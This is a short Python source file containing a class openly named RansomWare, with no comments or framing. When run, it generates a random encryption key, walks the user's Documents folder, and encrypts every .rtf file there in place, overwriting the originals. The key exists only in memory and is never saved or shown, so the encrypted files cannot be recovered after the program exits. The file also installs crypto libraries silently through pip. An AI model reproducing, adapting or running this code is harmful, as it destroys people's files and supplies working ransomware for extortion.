import os
try:
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
    from Crypto.Cipher import AES, PKCS1_OAEP
except ImportError:
    os.system('py -m pip install PyCryptodome')
try:
    from cryptography.fernet import Fernet
except ImportError:
    os.system('py -m pip install cryptography')
import base64
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from cryptography.fernet import Fernet
import ctypes
import time, datetime
import subprocess
import threading
class RansomWare:
    file_exts = [
        'rtf'
        ]
    def __init__(self):
        self.key = None
        self.crypter = None
        self.public_key = None
        self.sysRoot = os.path.expanduser('~')
    def generate_key(self):
        self.key =  Fernet.generate_key()
        self.crypter = Fernet(self.key)
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
            else:
                _data = self.crypter.decrypt(data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)
    def crypt_system(self, encrypted=False):
        dire1 = f'{self.sysRoot}\\Documents'
        system = os.walk(dire1, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)
def main():
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
if __name__ == '__main__':
    main()
